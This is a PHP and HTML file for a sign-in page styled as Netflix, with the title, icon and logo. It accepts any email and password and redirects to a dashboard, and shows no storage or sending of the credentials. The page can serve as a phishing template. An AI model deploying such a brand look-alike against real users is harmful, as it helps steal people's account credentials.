<?php

//print_r($_POST);

$username = $_POST['user-login-id'] ?? null;
$password = $_POST['password'] ?? null;

//echo "Username: $username, Password: $password";

if ($username and $password)
{
    header("Location: /dash.php");
    die();
}

?>
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/assets/css/index.css">

    <title>Netflix</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="/assets/nficon2016.ico">
</head>
<body>

    <div class="app-mount">
        <div class="login-wrapper-hybrid">
            <div class="login-wrapper-background">
                <img class="background-image" src="/assets/background-1.jpg">
            </div>
            <div class="login-header">
                <a class="signup-basic-header">
                    <img class="site-logo" src="/assets/logo-3.png">
                </a>
            </div>
            <div class="login-body">
                <div class="login-wrapper-content">
                    <div class="login-content">
                        <div class="login-form-main">
                            <h1>Sign In</h1>
                            <form method="post" class="login-form" action="">
                                <div class="login-input-email">
                                    <div class="input-placement">
                                        <div class="email-phone-controls">
                                            <label class="input-id">
                                                <input required type="text" name="user-login-id" class="text-field" id="id-user-login-id" value="" tabindex="0" autocomplete="email" dir="" autofocus>
                                                <label for="id-user-login-id" class="place-label">Email or phone number</label>
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                <div class="login-input-password">
                                    <div class="input-placement">
                                        <div class="password-controls">
                                            <label class="input-id">
                                                <input required type="password" name="password" class="text-field" id="id-password" value="" tabindex="0" autocomplete="password" dir="">
                                                <label for="id-password" class="place-label">Password</label>
                                            </label>
                                            <button id="id-password-toggle" type="button" class="password-toggle" title="Show Password">SHOW</button>
                                        </div>
                                    </div>
                                </div>
                                <button class="login-button-submit" type="submit" autocomplete="off" tabindex="0">Sign In</button>
                                <div class="login-form-help">
                                    <div class="login-remember-me">
                                        <input type="checkbox" class="remember-me" name="remember-me" id="remember-me" value="true" tabindex="0" checked="">
                                        <label for="remember-me" class="remember-me-label">
                                            <span class="login-remember-me-label-text">Remember me</span>
                                        </label>
                                        <div class="helper"></div>
                                    </div>
                                    <a href="/login-help" class="login-help-link">Need help?</a>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</body>
</html>
